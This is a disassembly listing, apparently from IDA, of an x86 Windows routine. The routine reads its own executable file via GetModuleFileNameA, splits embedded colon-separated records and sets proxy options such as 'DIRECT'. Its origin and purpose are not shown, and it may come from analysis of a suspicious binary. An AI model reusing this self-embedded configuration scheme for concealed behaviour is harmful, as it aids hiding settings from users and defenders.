                push    eax
                mov     eax, 1224h
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+1230h+var_10], eax
                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+1244h+var_C]
                mov     large fs:0, eax
                push    382h
                xor     ebp, ebp
                push    ebp
                push    offset byte_42BFA0
                call    sub_413520
                add     esp, 0Ch
                push    0FFFh
                lea     eax, [esp+1248h+var_100F]
                push    ebp
                push    eax
                mov     [esp+1250h+var_1010], 0
                call    sub_413520
                add     esp, 0Ch
                lea     ecx, [esp+1244h+var_1224]
                push    ecx
                call    sub_4091F0
                push    103h
                lea     edx, [esp+1248h+var_1117]
                push    ebp
                mov     [esp+124Ch+var_4], ebp
                push    edx
                mov     [esp+1250h+Filename], 0
                call    sub_413520
                add     esp, 0Ch
                push    104h            ; nSize
                lea     eax, [esp+1248h+Filename]
                push    eax             ; lpFilename
                push    ebp             ; hModule
                call    ds:GetModuleFileNameA
                lea     ecx, [esp+1244h+var_1010]
                push    ecx
                lea     edx, [esp+1248h+Filename]
                push    edx
                call    sub_40C190
                test    eax, eax
                jnz     short loc_407A36
                lea     esi, [esp+1244h+var_1224]
                mov     [esp+1244h+var_4], 1
                call    sub_409580
                mov     eax, [esp+1244h+var_1224]
                push    eax
                call    sub_40F15B
                add     esp, 4
                xor     eax, eax
                jmp     loc_408487
; ---------------------------------------------------------------------------

loc_407A36:                             ; CODE XREF: sub_407940+CC↑j
                mov     ecx, [esp+1244h+var_120C]
                mov     edx, [ecx+4]
                push    edx
                lea     ecx, [esp+1248h+var_1224]
                call    sub_409270
                mov     eax, [esp+1244h+var_120C]
                mov     [eax+4], eax
                mov     eax, [esp+1244h+var_120C]
                mov     [esp+1244h+var_1208], ebp
                mov     [eax], eax
                mov     eax, [esp+1244h+var_120C]
                mov     [eax+8], eax
                lea     esi, [esp+1244h+var_1010]
                mov     ebx, 0Fh
                mov     [esp+1244h+var_122C], esi
                mov     [esp+1244h+var_1138], ebx
                mov     [esp+1244h+var_113C], ebp
                mov     byte ptr [esp+1244h+var_114C], 0
                mov     byte ptr [esp+1244h+var_4], 2
                mov     [esp+1244h+var_1230], 3Ah
                jmp     short loc_407A9B
; ---------------------------------------------------------------------------

loc_407A94:                             ; CODE XREF: sub_407940+550↓j
                mov     ebx, 0Fh
                xor     ebp, ebp

loc_407A9B:                             ; CODE XREF: sub_407940+152↑j
                mov     eax, esi
                lea     edx, [eax+1]

loc_407AA0:                             ; CODE XREF: sub_407940+165↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_407AA0
                sub     eax, edx
                push    eax
                push    esi
                lea     ecx, [esp+124Ch+var_1150]
                call    sub_409840
                push    1
                lea     eax, [esp+1248h+var_1230]
                push    eax
                lea     ecx, [esp+124Ch+var_1150]
                push    ecx
                call    sub_408D80
                mov     edi, eax
                cmp     edi, 0FFFFFFFFh
                jz      loc_407D3E
                push    edi
                xor     ecx, ecx
                lea     esi, [esp+1248h+var_1134]
                lea     edx, [esp+1248h+var_1150]
                call    sub_408600
                push    0FFFFFFFFh
                lea     ecx, [edi+1]
                lea     esi, [esp+1248h+var_116C]
                lea     edx, [esp+1248h+var_1150]
                mov     byte ptr [esp+1248h+var_4], 3
                call    sub_408600
                lea     ecx, [esp+1244h+var_1134]
                lea     eax, [esp+1244h+var_1224]
                mov     byte ptr [esp+1244h+var_4], 4
                call    sub_40A580
                mov     ebx, [esp+1244h+var_1224]
                mov     edi, [esp+1244h+var_120C]
                mov     esi, eax
                mov     [esp+1244h+var_11C0], esi
                mov     [esp+1244h+var_11C4], ebx
                cmp     ebx, ebp
                jnz     short loc_407B49
                call    sub_40EC7A
                mov     ebx, [esp+1244h+var_1224]

loc_407B49:                             ; CODE XREF: sub_407940+1FE↑j
                cmp     esi, edi
                jz      short loc_407BA6
                cmp     dword ptr [esi+24h], 10h
                mov     edi, [esi+20h]
                jb      short loc_407B5B
                mov     esi, [esi+10h]
                jmp     short loc_407B5E
; ---------------------------------------------------------------------------

loc_407B5B:                             ; CODE XREF: sub_407940+214↑j
                add     esi, 10h

loc_407B5E:                             ; CODE XREF: sub_407940+219↑j
                mov     ebp, [esp+1244h+var_1120]
                mov     eax, ebp
                cmp     ebp, edi
                jb      short loc_407B6D
                mov     eax, edi

loc_407B6D:                             ; CODE XREF: sub_407940+229↑j
                cmp     [esp+1244h+var_111C], 10h
                mov     edx, [esp+1244h+var_1130]
                jnb     short loc_407B85
                lea     edx, [esp+1244h+var_1130]

loc_407B85:                             ; CODE XREF: sub_407940+23C↑j
                mov     ecx, esi
                call    sub_401050
                test    eax, eax
                jnz     short loc_407B9B
                cmp     ebp, edi
                jb      short loc_407BA6
                cmp     ebp, edi
                setnz   al
                test    eax, eax

loc_407B9B:                             ; CODE XREF: sub_407940+24E↑j
                jl      short loc_407BA6
                lea     eax, [esp+1244h+var_11C4]
                jmp     short loc_407BB6
; ---------------------------------------------------------------------------

loc_407BA6:                             ; CODE XREF: sub_407940+20B↑j
                                        ; sub_407940+252↑j ...
                mov     edx, [esp+1244h+var_120C]
                mov     [esp+1244h+var_1200], edx
                mov     [esp+1244h+var_1204], ebx
                lea     eax, [esp+1244h+var_1204]

loc_407BB6:                             ; CODE XREF: sub_407940+264↑j
                mov     esi, [eax]
                mov     edi, [eax+4]
                mov     ebp, [esp+1244h+var_120C]
                test    esi, esi
                jz      short loc_407BC7
                cmp     esi, ebx
                jz      short loc_407BCC

loc_407BC7:                             ; CODE XREF: sub_407940+281↑j
                call    sub_40EC7A

loc_407BCC:                             ; CODE XREF: sub_407940+285↑j
                cmp     edi, ebp
                jz      short loc_407C0A
                test    esi, esi
                jnz     short loc_407C06
                call    sub_40EC7A

loc_407BD9:                             ; CODE XREF: sub_407940+2C8↓j
                cmp     edi, [esi+18h]
                jnz     short loc_407BE3
                call    sub_40EC7A

loc_407BE3:                             ; CODE XREF: sub_407940+29C↑j
                push    0FFFFFFFFh
                push    0
                lea     eax, [esp+124Ch+var_116C]
                lea     ecx, [edi+28h]
                push    eax
                call    sub_408CA0
                mov     ebx, 0Fh
                lea     esi, [ebx+1]
                xor     edi, edi
                jmp     loc_407CEE
; ---------------------------------------------------------------------------

loc_407C06:                             ; CODE XREF: sub_407940+292↑j
                mov     esi, [esi]
                jmp     short loc_407BD9
; ---------------------------------------------------------------------------

loc_407C0A:                             ; CODE XREF: sub_407940+28E↑j
                lea     ecx, [esp+1244h+var_116C]
                push    ecx
                lea     edx, [esp+1248h+var_1134]
                push    edx
                lea     eax, [esp+124Ch+var_11BC]
                push    eax
                call    sub_408B70
                lea     ecx, [esp+1244h+var_11FC]
                push    ecx
                mov     edi, eax
                mov     byte ptr [esp+1248h+var_4], 5
                call    sub_40AEF0
                lea     edx, [esp+1244h+var_11FC]
                push    edx
                lea     eax, [esp+1248h+var_1184]
                push    eax
                lea     ecx, [esp+124Ch+var_1224]
                push    ecx
                mov     byte ptr [esp+1250h+var_4], 6
                call    sub_4088F0
                mov     esi, 10h
                cmp     [esp+1244h+var_11C8], esi
                jb      short loc_407C72
                mov     edx, [esp+1244h+var_11DC]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_407C72:                             ; CODE XREF: sub_407940+323↑j
                xor     edi, edi
                mov     ebx, 0Fh
                mov     [esp+1244h+var_11C8], ebx
                mov     [esp+1244h+var_11CC], edi
                mov     byte ptr [esp+1244h+var_11DC], 0
                cmp     [esp+1244h+var_11E4], esi
                jb      short loc_407C99
                mov     eax, [esp+1244h+var_11F8]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_407C99:                             ; CODE XREF: sub_407940+34A↑j
                mov     [esp+1244h+var_11E4], ebx
                mov     [esp+1244h+var_11E8], edi
                mov     byte ptr [esp+1244h+var_11F8], 0
                cmp     [esp+1244h+var_1188], esi
                jb      short loc_407CBF
                mov     ecx, [esp+1244h+var_119C]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_407CBF:                             ; CODE XREF: sub_407940+36D↑j
                mov     [esp+1244h+var_1188], ebx
                mov     [esp+1244h+var_118C], edi
                mov     byte ptr [esp+1244h+var_119C], 0
                cmp     [esp+1244h+var_11A4], esi
                jb      short loc_407CEE
                mov     edx, [esp+1244h+var_11B8]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_407CEE:                             ; CODE XREF: sub_407940+2C1↑j
                                        ; sub_407940+39C↑j
                cmp     [esp+1244h+var_1154], esi
                jb      short loc_407D07
                mov     eax, [esp+1244h+var_1168]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_407D07:                             ; CODE XREF: sub_407940+3B5↑j
                mov     byte ptr [esp+1244h+var_4], 2
                mov     [esp+1244h+var_1154], ebx
                mov     [esp+1244h+var_1158], edi
                mov     byte ptr [esp+1244h+var_1168], 0
                cmp     [esp+1244h+var_111C], esi
                jb      loc_407E79
                mov     ecx, [esp+1244h+var_1130]
                jmp     loc_407E70
; ---------------------------------------------------------------------------

loc_407D3E:                             ; CODE XREF: sub_407940+190↑j
                cmp     [esp+1244h+var_113C], ebp
                jbe     loc_407E79
                push    ebp
                push    offset szProxyBypass
                lea     ecx, [esp+124Ch+var_116C]
                mov     [esp+124Ch+var_1154], ebx
                mov     [esp+124Ch+var_1158], ebp
                mov     byte ptr [esp+124Ch+var_1168], 0
                call    sub_409840
                lea     edx, [esp+1244h+var_116C]
                push    edx
                lea     eax, [esp+1248h+var_1150]
                push    eax
                lea     ecx, [esp+124Ch+var_11BC]
                push    ecx
                mov     byte ptr [esp+1250h+var_4], 7
                call    sub_408B70
                lea     edx, [esp+1244h+var_11FC]
                push    edx
                mov     edi, eax
                mov     byte ptr [esp+1248h+var_4], 8
                call    sub_40AEF0
                lea     eax, [esp+1244h+var_11FC]
                push    eax
                lea     ecx, [esp+1248h+var_1178]
                push    ecx
                lea     edx, [esp+124Ch+var_1224]
                push    edx
                mov     byte ptr [esp+1250h+var_4], 9
                call    sub_4088F0
                mov     esi, 10h
                cmp     [esp+1244h+var_11C8], esi
                jb      short loc_407DE3
                mov     eax, [esp+1244h+var_11DC]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_407DE3:                             ; CODE XREF: sub_407940+494↑j
                mov     [esp+1244h+var_11C8], ebx
                mov     [esp+1244h+var_11CC], ebp
                mov     byte ptr [esp+1244h+var_11DC], 0
                cmp     [esp+1244h+var_11E4], esi
                jb      short loc_407E03
                mov     ecx, [esp+1244h+var_11F8]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_407E03:                             ; CODE XREF: sub_407940+4B4↑j
                mov     [esp+1244h+var_11E4], ebx
                mov     [esp+1244h+var_11E8], ebp
                mov     byte ptr [esp+1244h+var_11F8], 0
                cmp     [esp+1244h+var_1188], esi
                jb      short loc_407E29
                mov     edx, [esp+1244h+var_119C]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_407E29:                             ; CODE XREF: sub_407940+4D7↑j
                mov     [esp+1244h+var_1188], ebx
                mov     [esp+1244h+var_118C], ebp
                mov     byte ptr [esp+1244h+var_119C], 0
                cmp     [esp+1244h+var_11A4], esi
                jb      short loc_407E58
                mov     eax, [esp+1244h+var_11B8]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_407E58:                             ; CODE XREF: sub_407940+506↑j
                mov     byte ptr [esp+1244h+var_4], 2
                cmp     [esp+1244h+var_1154], esi
                jb      short loc_407E79
                mov     ecx, [esp+1244h+var_1168]

loc_407E70:                             ; CODE XREF: sub_407940+3F9↑j
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_407E79:                             ; CODE XREF: sub_407940+3EC↑j
                                        ; sub_407940+405↑j ...
                mov     esi, [esp+1244h+var_122C]
                add     esi, 200h
                lea     edx, [esp+1244h+var_10]
                mov     [esp+1244h+var_122C], esi
                cmp     esi, edx
                jb      loc_407A94
                push    3
                push    offset unk_42274C
                lea     ecx, [esp+124Ch+var_116C]
                mov     [esp+124Ch+var_1154], 0Fh
                mov     [esp+124Ch+var_1158], 0
                mov     byte ptr [esp+124Ch+var_1168], 0
                call    sub_409840
                lea     eax, [esp+1244h+var_116C]
                push    eax
                lea     ecx, [esp+1248h+var_1204]
                push    ecx
                lea     esi, [esp+124Ch+var_1224]
                mov     byte ptr [esp+124Ch+var_4], 0Ah
                call    sub_408AC0
                mov     edi, [eax]
                mov     esi, [eax+4]
                mov     ebp, [esp+1244h+var_120C]
                test    edi, edi
                jz      short loc_407EF8
                cmp     edi, [esp+1244h+var_1224]
                jz      short loc_407EFD

loc_407EF8:                             ; CODE XREF: sub_407940+5B0↑j
                call    sub_40EC7A

loc_407EFD:                             ; CODE XREF: sub_407940+5B6↑j
                cmp     esi, ebp
                setz    bl
                mov     byte ptr [esp+1244h+var_4], 2
                cmp     [esp+1244h+var_1154], 10h
                jb      short loc_407F24
                mov     edx, [esp+1244h+var_1168]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_407F24:                             ; CODE XREF: sub_407940+5D2↑j
                test    bl, bl
                jz      short loc_407F7C
                cmp     [esp+1244h+var_1138], 10h
                jb      short loc_407F42
                mov     eax, [esp+1244h+var_114C]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_407F42:                             ; CODE XREF: sub_407940+5F0↑j
                mov     [esp+1244h+var_1138], 0Fh
                mov     [esp+1244h+var_113C], 0
                mov     byte ptr [esp+1244h+var_114C], 0

loc_407F60:                             ; CODE XREF: sub_407940+87E↓j
                lea     ecx, [esp+1244h+var_1224]
                push    ecx
                mov     [esp+1248h+var_4], 0FFFFFFFFh
                call    sub_4084B0
                xor     eax, eax
                jmp     loc_408487
; ---------------------------------------------------------------------------

loc_407F7C:                             ; CODE XREF: sub_407940+5E6↑j
                test    edi, edi
                jnz     short loc_407F9C
                call    sub_40EC7A
                xor     eax, eax

loc_407F87:                             ; CODE XREF: sub_407940+65E↓j
                cmp     esi, [eax+18h]
                jnz     short loc_407F91
                call    sub_40EC7A

loc_407F91:                             ; CODE XREF: sub_407940+64A↑j
                cmp     dword ptr [esi+40h], 10h
                jb      short loc_407FA0
                mov     eax, [esi+2Ch]
                jmp     short loc_407FA3
; ---------------------------------------------------------------------------

loc_407F9C:                             ; CODE XREF: sub_407940+63E↑j
                mov     eax, [edi]
                jmp     short loc_407F87
; ---------------------------------------------------------------------------

loc_407FA0:                             ; CODE XREF: sub_407940+655↑j
                lea     eax, [esi+2Ch]

loc_407FA3:                             ; CODE XREF: sub_407940+65A↑j
                lea     edx, [eax+1]

loc_407FA6:                             ; CODE XREF: sub_407940+66B↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_407FA6
                sub     eax, edx
                mov     ebp, eax
                test    edi, edi
                jnz     short loc_407FCF
                call    sub_40EC7A

loc_407FBA:                             ; CODE XREF: sub_407940+691↓j
                cmp     esi, [edi+18h]
                jnz     short loc_407FC4
                call    sub_40EC7A

loc_407FC4:                             ; CODE XREF: sub_407940+67D↑j
                cmp     dword ptr [esi+40h], 10h
                jb      short loc_407FD3
                mov     esi, [esi+2Ch]
                jmp     short loc_407FD6
; ---------------------------------------------------------------------------

loc_407FCF:                             ; CODE XREF: sub_407940+673↑j
                mov     edi, [edi]
                jmp     short loc_407FBA
; ---------------------------------------------------------------------------

loc_407FD3:                             ; CODE XREF: sub_407940+688↑j
                add     esi, 2Ch

loc_407FD6:                             ; CODE XREF: sub_407940+68D↑j
                push    ebp
                push    esi
                push    offset byte_42BFA0
                call    sub_414550
                add     esp, 0Ch
                push    3
                push    offset unk_422750
                lea     ecx, [esp+124Ch+var_116C]
                mov     [esp+124Ch+var_1154], 0Fh
                mov     [esp+124Ch+var_1158], 0
                mov     byte ptr [esp+124Ch+var_1168], 0
                call    sub_409840
                lea     edx, [esp+1244h+var_116C]
                push    edx
                lea     eax, [esp+1248h+var_1204]
                push    eax
                lea     esi, [esp+124Ch+var_1224]
                mov     byte ptr [esp+124Ch+var_4], 0Bh
                call    sub_408AC0
                mov     esi, [eax]
                mov     edi, [eax+4]
                mov     ebp, [esp+1244h+var_120C]
                test    esi, esi
                jz      short loc_408047
                cmp     esi, [esp+1244h+var_1224]
                jz      short loc_40804C

loc_408047:                             ; CODE XREF: sub_407940+6FF↑j
                call    sub_40EC7A

loc_40804C:                             ; CODE XREF: sub_407940+705↑j
                cmp     edi, ebp
                setz    bl
                mov     byte ptr [esp+1244h+var_4], 2
                cmp     [esp+1244h+var_1154], 10h
                jb      short loc_408073
                mov     ecx, [esp+1244h+var_1168]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_408073:                             ; CODE XREF: sub_407940+721↑j
                test    bl, bl
                jz      short loc_4080CB
                cmp     [esp+1244h+var_1138], 10h
                jb      short loc_408091
                mov     edx, [esp+1244h+var_114C]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_408091:                             ; CODE XREF: sub_407940+73F↑j
                lea     eax, [esp+1244h+var_1224]
                push    eax
                mov     [esp+1248h+var_1138], 0Fh
                mov     [esp+1248h+var_113C], 0
                mov     byte ptr [esp+1248h+var_114C], 0
                mov     [esp+1248h+var_4], 0FFFFFFFFh
                call    sub_4084B0
                xor     eax, eax
                jmp     loc_408487
; ---------------------------------------------------------------------------

loc_4080CB:                             ; CODE XREF: sub_407940+735↑j
                test    esi, esi
                jnz     short loc_4080EB
                call    sub_40EC7A
                xor     eax, eax

loc_4080D6:                             ; CODE XREF: sub_407940+7AD↓j
                cmp     edi, [eax+18h]
                jnz     short loc_4080E0
                call    sub_40EC7A

loc_4080E0:                             ; CODE XREF: sub_407940+799↑j
                cmp     dword ptr [edi+40h], 10h
                jb      short loc_4080EF
                mov     eax, [edi+2Ch]
                jmp     short loc_4080F2
; ---------------------------------------------------------------------------

loc_4080EB:                             ; CODE XREF: sub_407940+78D↑j
                mov     eax, [esi]
                jmp     short loc_4080D6
; ---------------------------------------------------------------------------

loc_4080EF:                             ; CODE XREF: sub_407940+7A4↑j
                lea     eax, [edi+2Ch]

loc_4080F2:                             ; CODE XREF: sub_407940+7A9↑j
                lea     edx, [eax+1]

loc_4080F5:                             ; CODE XREF: sub_407940+7BA↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_4080F5
                sub     eax, edx
                mov     ebx, eax
                test    esi, esi
                jnz     short loc_40811E
                call    sub_40EC7A

loc_408109:                             ; CODE XREF: sub_407940+7E0↓j
                cmp     edi, [esi+18h]
                jnz     short loc_408113
                call    sub_40EC7A

loc_408113:                             ; CODE XREF: sub_407940+7CC↑j
                cmp     dword ptr [edi+40h], 10h
                jb      short loc_408122
                mov     edi, [edi+2Ch]
                jmp     short loc_408125
; ---------------------------------------------------------------------------

loc_40811E:                             ; CODE XREF: sub_407940+7C2↑j
                mov     esi, [esi]
                jmp     short loc_408109
; ---------------------------------------------------------------------------

loc_408122:                             ; CODE XREF: sub_407940+7D7↑j
                add     edi, 2Ch

loc_408125:                             ; CODE XREF: sub_407940+7DC↑j
                push    ebx
                push    edi
                push    offset unk_42C060
                call    sub_414550
                add     esp, 0Ch
                push    offset unk_422754
                lea     ecx, [esp+1248h+var_116C]
                call    sub_408560
                lea     ecx, [esp+1244h+var_116C]
                push    ecx
                lea     edx, [esp+1248h+var_1204]
                push    edx
                lea     esi, [esp+124Ch+var_1224]
                mov     byte ptr [esp+124Ch+var_4], 0Ch
                call    sub_408AC0
                mov     ecx, [eax]
                mov     esi, [eax+4]
                mov     edi, [esp+1244h+var_120C]
                mov     [esp+1244h+var_122C], ecx
                mov     [esp+1244h+var_1228], esi
                test    ecx, ecx
                jz      short loc_40817E
                cmp     ecx, [esp+1244h+var_1224]
                jz      short loc_408183

loc_40817E:                             ; CODE XREF: sub_407940+836↑j
                call    sub_40EC7A

loc_408183:                             ; CODE XREF: sub_407940+83C↑j
                cmp     esi, edi
                mov     ebp, 10h
                setz    bl
                mov     byte ptr [esp+1244h+var_4], 2
                cmp     [esp+1244h+var_1154], ebp
                jb      short loc_4081AE
                mov     eax, [esp+1244h+var_1168]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_4081AE:                             ; CODE XREF: sub_407940+85C↑j
                test    bl, bl
                jz      short loc_4081C3
                lea     ecx, [esp+1244h+var_1150]
                call    sub_4085D0
                jmp     loc_407F60
; ---------------------------------------------------------------------------

loc_4081C3:                             ; CODE XREF: sub_407940+870↑j
                lea     esi, [esp+1244h+var_122C]
                call    sub_408B40
                add     eax, 1Ch
                cmp     [eax+18h], ebp
                jb      short loc_4081D9
                mov     eax, [eax+4]
                jmp     short loc_4081DC
; ---------------------------------------------------------------------------

loc_4081D9:                             ; CODE XREF: sub_407940+892↑j
                add     eax, 4

loc_4081DC:                             ; CODE XREF: sub_407940+897↑j
                lea     edx, [eax+1]
                nop

loc_4081E0:                             ; CODE XREF: sub_407940+8A5↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_4081E0
                sub     eax, edx
                lea     esi, [esp+1244h+var_122C]
                mov     edi, eax
                call    sub_408B40
                add     eax, 1Ch
                cmp     [eax+18h], ebp
                jb      short loc_408201
                mov     eax, [eax+4]
                jmp     short loc_408204
; ---------------------------------------------------------------------------

loc_408201:                             ; CODE XREF: sub_407940+8BA↑j
                add     eax, 4

loc_408204:                             ; CODE XREF: sub_407940+8BF↑j
                push    edi
                push    eax
                push    offset unk_42C020
                call    sub_414550
                add     esp, 0Ch
                push    offset unk_422758
                lea     ecx, [esp+1248h+var_116C]
                call    sub_408560
                lea     edx, [esp+1244h+var_116C]
                push    edx
                lea     eax, [esp+1248h+var_1204]
                push    eax
                lea     esi, [esp+124Ch+var_1224]
                mov     byte ptr [esp+124Ch+var_4], 0Dh
                call    sub_408AC0
                mov     ecx, [eax]
                mov     esi, [eax+4]
                mov     edi, [esp+1244h+var_120C]
                mov     [esp+1244h+var_122C], ecx
                mov     [esp+1244h+var_1228], esi
                test    ecx, ecx
                jz      short loc_40825D
                cmp     ecx, [esp+1244h+var_1224]
                jz      short loc_408262

loc_40825D:                             ; CODE XREF: sub_407940+915↑j
                call    sub_40EC7A

loc_408262:                             ; CODE XREF: sub_407940+91B↑j
                cmp     esi, edi
                lea     ecx, [esp+1244h+var_116C]
                setnz   bl
                mov     byte ptr [esp+1244h+var_4], 2
                call    sub_4085D0
                test    bl, bl
                jz      short loc_4082D3
                lea     esi, [esp+1244h+var_122C]
                call    sub_408B40
                add     eax, 1Ch
                mov     ebx, 10h
                cmp     [eax+18h], ebx
                jb      short loc_40829A
                mov     eax, [eax+4]
                jmp     short loc_40829D
; ---------------------------------------------------------------------------

loc_40829A:                             ; CODE XREF: sub_407940+953↑j
                add     eax, 4

loc_40829D:                             ; CODE XREF: sub_407940+958↑j
                lea     edx, [eax+1]

loc_4082A0:                             ; CODE XREF: sub_407940+965↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_4082A0
                sub     eax, edx
                lea     esi, [esp+1244h+var_122C]
                mov     edi, eax
                call    sub_408B40
                add     eax, 1Ch
                cmp     [eax+18h], ebx
                jb      short loc_4082C1
                mov     eax, [eax+4]
                jmp     short loc_4082C4
; ---------------------------------------------------------------------------

loc_4082C1:                             ; CODE XREF: sub_407940+97A↑j
                add     eax, 4

loc_4082C4:                             ; CODE XREF: sub_407940+97F↑j
                push    edi
                push    eax
                push    offset unk_42C0A0
                call    sub_414550
                add     esp, 0Ch

loc_4082D3:                             ; CODE XREF: sub_407940+93D↑j
                push    offset unk_42275C
                lea     ecx, [esp+1248h+var_116C]
                call    sub_408560
                lea     ecx, [esp+1244h+var_116C]
                push    ecx
                lea     edx, [esp+1248h+var_1204]
                push    edx
                lea     esi, [esp+124Ch+var_1224]
                mov     byte ptr [esp+124Ch+var_4], 0Eh
                call    sub_408AC0
                mov     ecx, [eax]
                mov     esi, [eax+4]
                mov     edi, [esp+1244h+var_120C]
                mov     [esp+1244h+var_122C], ecx
                mov     [esp+1244h+var_1228], esi
                test    ecx, ecx
                jz      short loc_40831D
                cmp     ecx, [esp+1244h+var_1224]
                jz      short loc_408322

loc_40831D:                             ; CODE XREF: sub_407940+9D5↑j
                call    sub_40EC7A

loc_408322:                             ; CODE XREF: sub_407940+9DB↑j
                cmp     esi, edi
                lea     ecx, [esp+1244h+var_116C]
                setnz   bl
                mov     byte ptr [esp+1244h+var_4], 2
                call    sub_4085D0
                test    bl, bl
                jz      short loc_408393
                lea     esi, [esp+1244h+var_122C]
                call    sub_408B40
                add     eax, 1Ch
                mov     ebx, 10h
                cmp     [eax+18h], ebx
                jb      short loc_40835A
                mov     eax, [eax+4]
                jmp     short loc_40835D
; ---------------------------------------------------------------------------

loc_40835A:                             ; CODE XREF: sub_407940+A13↑j
                add     eax, 4

loc_40835D:                             ; CODE XREF: sub_407940+A18↑j
                lea     edx, [eax+1]

loc_408360:                             ; CODE XREF: sub_407940+A25↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_408360
                sub     eax, edx
                lea     esi, [esp+1244h+var_122C]
                mov     edi, eax
                call    sub_408B40
                add     eax, 1Ch
                cmp     [eax+18h], ebx
                jb      short loc_408381
                mov     eax, [eax+4]
                jmp     short loc_408384
; ---------------------------------------------------------------------------

loc_408381:                             ; CODE XREF: sub_407940+A3A↑j
                add     eax, 4

loc_408384:                             ; CODE XREF: sub_407940+A3F↑j
                push    edi
                push    eax
                push    offset unk_42C120
                call    sub_414550
                add     esp, 0Ch

loc_408393:                             ; CODE XREF: sub_407940+9FD↑j
                push    offset unk_422760
                lea     ecx, [esp+1248h+var_116C]
                call    sub_408560
                lea     eax, [esp+1244h+var_116C]
                push    eax
                lea     ecx, [esp+1248h+var_1204]
                push    ecx
                lea     esi, [esp+124Ch+var_1224]
                mov     byte ptr [esp+124Ch+var_4], 0Fh
                call    sub_408AC0
                mov     ecx, [eax]
                mov     esi, [eax+4]
                mov     edi, [esp+1244h+var_120C]
                test    ecx, ecx
                jz      short loc_4083D5
                cmp     ecx, [esp+1244h+var_1224]
                jz      short loc_4083DA

loc_4083D5:                             ; CODE XREF: sub_407940+A8D↑j
                call    sub_40EC7A

loc_4083DA:                             ; CODE XREF: sub_407940+A93↑j
                cmp     esi, edi
                lea     ecx, [esp+1244h+var_116C]
                setnz   bl
                mov     byte ptr [esp+1244h+var_4], 2
                call    sub_4085D0
                test    bl, bl
                jz      short loc_4083FE
                mov     byte_42C320, 1

loc_4083FE:                             ; CODE XREF: sub_407940+AB5↑j
                push    offset aDirect  ; "DIRECT"
                lea     ecx, [esp+1248h+var_116C]
                call    sub_408560
                lea     edx, [esp+1244h+var_116C]
                push    edx
                lea     eax, [esp+1248h+var_1204]
                push    eax
                lea     esi, [esp+124Ch+var_1224]
                mov     byte ptr [esp+124Ch+var_4], 10h
                call    sub_408AC0
                mov     ecx, [eax]
                mov     esi, [eax+4]
                mov     edi, [esp+1244h+var_120C]
                test    ecx, ecx
                jz      short loc_408440
                cmp     ecx, [esp+1244h+var_1224]
                jz      short loc_408445

loc_408440:                             ; CODE XREF: sub_407940+AF8↑j
                call    sub_40EC7A

loc_408445:                             ; CODE XREF: sub_407940+AFE↑j
                cmp     esi, edi
                lea     ecx, [esp+1244h+var_116C]
                setnz   bl
                call    sub_4085D0
                test    bl, bl
                jz      short loc_408461
                mov     byte_42C321, 1

loc_408461:                             ; CODE XREF: sub_407940+B18↑j
                lea     ecx, [esp+1244h+var_1150]
                call    sub_4085D0
                lea     ecx, [esp+1244h+var_1224]
                push    ecx
                mov     [esp+1248h+var_4], 0FFFFFFFFh
                call    sub_4084B0
                mov     eax, 1

loc_408487:                             ; CODE XREF: sub_407940+F1↑j
                                        ; sub_407940+637↑j ...
                mov     ecx, [esp+1244h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                mov     ecx, [esp+1230h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 1230h
                retn
sub_407940      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4084B0      proc near               ; CODE XREF: sub_407940+630↑p
                                        ; sub_407940+77F↑p ...

var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  4

                push    0FFFFFFFFh
                push    offset SEH_4084B0
                mov     eax, large fs:0
                push    eax
                push    ecx
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+18h+var_C]
                mov     large fs:0, eax
                mov     esi, [esp+18h+arg_0]
                mov     [esp+18h+var_4], 0
                call    sub_409580
                mov     eax, [esi]
                push    eax
                call    sub_40F15B
                add     esp, 4
                mov     ecx, [esp+18h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                add     esp, 10h
                retn    4
sub_4084B0      endp

; ---------------------------------------------------------------------------
                align 10h
; START OF FUNCTION CHUNK FOR sub_41EA09
;   ADDITIONAL PARENT FUNCTION sub_41EA14
;   ADDITIONAL PARENT FUNCTION sub_41EA2A
;   ADDITIONAL PARENT FUNCTION sub_41EA35

loc_408510:                             ; CODE XREF: sub_41EA09+6↓j
                                        ; sub_41EA14+6↓j ...
                cmp     dword ptr [esi+34h], 10h
                jb      short loc_408522
                mov     eax, [esi+20h]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_408522:                             ; CODE XREF: sub_41EA09-164F5↑j
                push    ebx
                xor     ebx, ebx
                mov     dword ptr [esi+34h], 0Fh
                mov     [esi+30h], ebx
                mov     [esi+20h], bl
                cmp     dword ptr [esi+18h], 10h
                jb      short loc_408544
                mov     ecx, [esi+4]
                push    ecx
                call    sub_40F15B
                add     esp, 4

